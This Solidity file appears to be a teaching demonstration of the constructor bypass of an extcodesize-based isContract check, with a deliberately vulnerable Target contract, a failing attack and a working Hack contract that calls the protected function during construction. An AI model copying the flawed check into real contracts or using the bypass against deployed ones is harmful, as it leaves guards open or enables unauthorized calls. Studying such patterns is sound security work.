// SPDX-License-Identifier: MIT
pragma solidity ^0.8.6;
 // deploy all three contracts below 
// 1 target contract 
// 2 failed attack contract 
// 3 attacking contract  
// the isContract function uses extcodesize which checks code size  
// if the code size is greater then 0 then it is assumed a smart contract  
// this check can be bypassed because when a contract is created the code size is 0   
// to bypass this check simply add a function to the attacking contracts constructor
 contract Target {
      function isContract(address account) public view returns (bool) {
          uint size;
          assembly {
              size := extcodesize(account)
          }
          return size > 0;
      }
         bool public pwned = false; // function contains a function modifier to protect it from other contracts
// no contracts can call this function
      function protected() external {     
         require(!isContract(msg.sender), "no contract allowed");     
         pwned = true; }
 }
 

// attempting to call Target.protected will fail, 
// target block calls from contract
 contract FailedAttack {
     function pwn(address _target) external {
         // this will fail
         Target(_target).protected();
     }
 }
 

// when contract is being created, code size (extcodesize) is 0. 
// this will bypass the isContract() check 
// call Target.protected will work
 contract Hack {
     bool public isContract;
     address public addr;
        constructor(address _target) {  
        isContract = Target(_target).isContract(address(this)); 
        addr = address(this); 
         // this will work          
            Target(_target).protected(); }
}